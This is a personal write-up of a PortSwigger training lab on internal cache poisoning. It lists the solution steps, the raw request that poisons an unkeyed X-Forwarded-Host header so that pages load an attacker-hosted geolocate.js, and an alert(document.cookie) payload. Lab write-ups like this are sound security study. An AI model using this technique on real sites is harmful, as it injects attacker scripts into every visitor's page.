# Web Cache Poisoning Lab 13 — Internal cache poisoning — PortSwigger

**Platform:** PortSwigger Web Security Academy (free lab)
**Topic:** Web Cache Poisoning
**Lab:** Internal cache poisoning
**Difficulty:** Expert
**Solved:** 27 November 2026 ~06:50 PKT (banner verified on the instance home page)
**Account:** Arbaz Ahmed Naveed
**Instance:** https://0a520078030fcdcd80d11ce4007000c6.web-security-academy.net/
**Exploit server:** https://exploit-0ac6006703b5cdb580621b7301d4003d.exploit-server.net

## Vulnerability Type

Internal (fragment) cache poisoning — the site has two cache layers. The external cache keys on the query string, but an *internal* fragment cache ignores it. The `geolocate.js` import URL is rendered from a fragment cached internally; poisoning that fragment with an unkeyed `X-Forwarded-Host` header makes every visitor load the attacker's script.

## Solution

1. Stored the exploit file on the lab's exploit server at `/js/geolocate.js` with body `alert(document.cookie)`.
2. **Poison the internal fragment.** The external cache keys on the query string, so a plain `/` request is served from the external cache and never reaches the app — the internal fragment is never re-poisoned. The fix is a *fresh cache buster on every request* (forcing an external miss so the request reaches the back end) while the internal fragment — which ignores the query string — is poisoned by the same request:
   ```
   GET /?cb=<random> HTTP/1.1
   Host: 0a520078030fcdcd80d11ce4007000c6.web-security-academy.net
   X-Forwarded-Host: exploit-0ac6006703b5cdb580621b7301d4003d.exploit-server.net
   ```
   Repeated until the `geolocate.js` `src` in the response pointed at the exploit server (the canonical link and the `analytics.js` import flip first; the `geolocate.js` fragment takes longer — it is cached separately inside the app).
3. **Poison the external entry.** Once the internal fragment was poisoned, sent plain `/` requests with the same `X-Forwarded-Host` until all three dynamic URLs (canonical, `analytics.js`, `geolocate.js`) pointed at the exploit server. The victim loaded the home page, fetched `geolocate.js` from the exploit server, and the home page showed "Congratulations, you solved the lab!"

Full solver: `~/workspace/scripts/ps-cache-poisoning.py` (Lab 13).

## Practical Explanation

- **Why the first attempt failed:** the first solver version sent plain `/` requests only. The external entry was poisoned quickly (canonical + `analytics.js` flipped), but every later request was an external *hit* — it never reached the back end, so the internal fragment stayed clean for the whole 420-second run. The cache buster is what forces the request through to the internal cache.
- **Why the fragment flips last:** the `geolocate.js` URL comes from a template fragment with its own internal TTL, separate from the external entry. It only re-renders when the fragment expires *and* a request carrying the poisoned header arrives in that window — hence "keep sending the request" and a fresh buster each time.
- **How to tell the layers apart:** remove the `X-Forwarded-Host` header and re-request — the internally cached fragment still shows the exploit-server URL while the other two URLs revert. That proves the header is unkeyed by the internal cache but keyed by the external one.

## Lessons Learned

- Modern sites have *layers* of caching (CDN, reverse proxy, in-app fragment caches) with different keys — poisoning one layer does not poison the others, and each layer needs its own buster strategy.
- When a poison "half works" (some URLs flip, one does not), suspect a second cache layer with a different key and a longer TTL.
- A cache buster is not just for probing: here a *changing* buster on every request is the mechanism that reaches the internal cache at all.
- Internal caches are the hardest to test safely on real sites — a poisoned fragment can persist long after the outer cache expires.
